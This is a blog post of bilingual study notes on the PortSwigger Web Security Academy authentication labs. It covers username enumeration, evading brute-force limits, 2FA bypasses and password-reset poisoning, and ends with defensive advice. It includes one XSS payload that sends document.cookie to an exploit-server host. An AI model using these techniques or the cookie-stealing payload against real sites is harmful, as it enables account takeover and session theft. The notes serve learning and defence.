---
layout: article
title: Authentication--Web Security Academy 2
mathjax: true
key: a00004	
cover: /bkgs/1.png
modify_date: 2021-08-6
show_author_profile: true
excerpt_type: html
tag: 
- Academy
- Authentication
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

# 前言

这篇是Web Security Academy的Authentication部分
<!--more-->
https://portswigger.net/web-security/sql-injection/cheat-sheet)

# 身份鉴定三因素

There are three authentication factors into which different types of authentication can be categorized:

- Something you **know**, such as a password

- Something you **have**, that is, a physical object like a mobile phone or security token

- Something you **are** or do, for example, your biometrics or patterns of behavior

  

# Vulnerabilities in password-based login

## Username enumeration

you should pay particular attention to any differences in:

**Status codes:like 200 302** 

**Error messages**: any difference , even a ','

**Response times**: set the password to a long long one ,check the response time.

you can change X-Forwarded-For to change your ip (or Host to localhost)

## Flawed brute-force protection

### IP block

- **change it**（云函数hhh）
- **login and logout** **，有些登陆进去后会重置失败次数**
- **一次传多个密码**

### **account locking**

- **在被锁次数内枚举，可能有些返回会不同**

# Vulnerabilities in multi-factor authentication

同一因素验证两边并不是两步验证

LIKE Email-based 2FA

一般来讲需要从某个设备生成code而不是从网络上接收code

bypass：

- 网站不一定会验证第二步是否成功，可以直接输入路径尝试  /my-account
- 利用逻辑漏洞绕过第一步或第二步（比如用a登陆b，修改a的token为b之类）
- 即便设置了验证次数，仍然可以通过宏来反复登陆爆破验证码（如果每次都重新生成一次验证码呢？）

# Vulnerabilities in other authentication mechanisms

## Keeping users logged in

if the cookie is easy to guess , like (name:pass(md5))base63, it's easy to brute-force.

XSS could also be used , like 

```javascript
<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
```

to steal cookie and decode it 

## Resetting user passwords

### Sending passwords by email

### Resetting passwords using a URL

- token is not working , just change the user and it would work
- change X-Forwarded-Host: your-exploit-server-id , lure the victim to send you the email received from server , and replace your token with his to change his     passwd

### Password reset poisoning

- manipulates a vulnerable website into generating a password reset link pointing to a domain under their control(like change XFH above)

- 即想办法生成并诱导victim点击指向hacker服务器从目标服务器发出的带有token的链接

（Host: acb31f7e1e4ece4480c60b980199009e.web-security-academy.ne）

## Changing user passwords

- Typically, changing your password involves entering your current password and then the new password twice

- you might be able to change others passwd by edit your post infos , and differ by the response(right passwd shows two new passwd are not same , error passwd shows error passwd)

# Vulnerabilities in third-party authentication mechanisms

oauth authentication(see other notes)

# How to secure your authentication mechanisms

- Take care with  user credentials

- - redirecting  any attempted HTTP requests to HTTPS 
  - make sure that no username or email addresses are disclosed either through publicly accessible profiles or reflected in HTTP responses

- Don't count on users for security

- Prevent username enumeration

- - Regardless  of whether an attempted username is valid,use identical, generic error messages, and make sure they really are identical. 
  - always return the same HTTP status code with each login request
  - make the response times in different scenarios as indistinguishable as possible.

- Implement robust brute-force protection

- -  implement strict, IP-based user rate limiting

- - require the user to complete a CAPTCHA test with every login attempt after a certain limit is reached.

- Triple-check your verification logic

- Don't forget supplementary functionality

- - Remember  that a password reset or change is just as valid an attack surface as the  main login mechanism and, consequently, must be equally as robust.

- Implement proper multi-factor authentication

- - Remember  that verifying multiple instances of the same factor is not true  multi-factor authentication（Sending verification codes  via email is essentially just a more long-winded form of single-factor  authentication.）

- - Ideally, 2FA should be  implemented using a dedicated device or app that generates the  verification code directly

- - Finally, just as with the main  authentication logic, make sure that the logic in your 2FA checks is  sound so that it cannot be easily bypassed.